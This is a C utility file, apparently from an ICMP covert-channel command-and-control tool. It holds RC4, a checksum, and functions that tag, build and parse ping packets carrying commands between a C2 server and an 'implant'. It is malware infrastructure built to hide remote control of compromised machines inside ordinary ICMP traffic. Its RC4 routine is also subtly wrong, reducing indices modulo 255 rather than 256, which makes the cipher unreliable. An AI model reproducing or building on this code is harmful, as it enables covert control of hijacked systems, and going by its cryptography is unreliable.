#include <string.h>
#include <unistd.h>

#include "../include/utils.h"

void rc4(unsigned char* data, long data_len, unsigned char* key, long key_len, unsigned char* result) {
    unsigned char T[256];
    unsigned char S[256];
    unsigned char tmp; // to be used in swaping
    int j = 0, t = 0, i= 0;

    // initialize S & K
    for (int i = 0 ; i < 256 ; i++) {
        S[i] = i;
        T[i] = key[i % key_len];
    }

    // state permutation
    for(int i = 0 ; i < 256; i++) {
        j = (j + S[i] + T[i]) % 255;

        // swap S[i] & S[j]
        tmp = S[j];
        S[j] = S[i];
        S[i] = tmp;
    }

    j = 0; // reintializing j for reuse

    for(int x = 0 ; x < data_len ; x++) {
        i = (i +1) % 255;
        j = (j + S[i]) % 255;

        //Swap S[i] & S[j]
        tmp = S[j];
        S[j] = S[i];
        S[i] = tmp;

        t = (S[i] + S[j]) % 255;

        result[x]= data[x] ^ S[t]; // XOR generated S[t] with Byte from the plaintext / cipher and append each Encrypted/Decrypted byte to result array
    }
}

// calculate checksum (proudly? stolen from the internet)
unsigned short cksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
      sum += *w++;
      nleft -= 2;
    }

    if (nleft == 1) {
      *(unsigned char *)(&answer) = *(unsigned char *)w;
      sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return answer;
}

// reads from the socket and put it in the buffer
ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size) {
    ssize_t nbytes = read(sockfd, buffer, size);

    if (nbytes < 0) {
        return -1;
    }

    return nbytes;
}

// check if we got an actual connection from our implant
/* TODO: dynamic id */
int check_magic_byte(struct icmphdr *icmp) {
    if (icmp->code == 8 && icmp->un.echo.id == RAND_ID) {
        return 1;
    }
    return 0;
}

// prep'ing the IP headers for later usage
struct sockaddr_in prep_ip_headers(struct iphdr *ip) {
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip->saddr;

    return addr;
}

// parse the data section
unsigned char *parse_data_section(unsigned char *packet) {
    // get the data section (ignoring the IP & ICMP headers)
    unsigned char *data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));

    return data;
}

// prep'ing the ICMP headers & setting up the checksum for c2
void c2_prep_icmp_headers(struct icmphdr *icmp, size_t input_size) {
    icmp->type = ICMP_ECHOREPLY;
    icmp->code = ICMP_ECHO;
    icmp->un.echo.id = RAND_ID;
    icmp->checksum = 0;
    icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + input_size);
}

// prep'ing the ICMP headers & setting up the checksum for implant
void implant_prep_icmp_headers(struct icmphdr *icmp, size_t input_size) {
    icmp->type = ICMP_ECHO;
    icmp->code = ICMP_ECHO;
    icmp->un.echo.id = RAND_ID;
    icmp->checksum = 0;
    icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + input_size);
}

// append the command to the data section of the packet for c2
void c2_append_to_data_section(struct icmphdr *icmp, unsigned char *input) {
    memcpy((unsigned char *) icmp + sizeof(struct icmphdr), input, strlen((char *) input));
}

// append the command to the data section of the packet for implant
void implant_append_to_data_section(struct icmphdr *icmp, unsigned char *input) {
    memcpy((unsigned char *) icmp + sizeof(struct icmphdr), input, strlen((char *) input));
}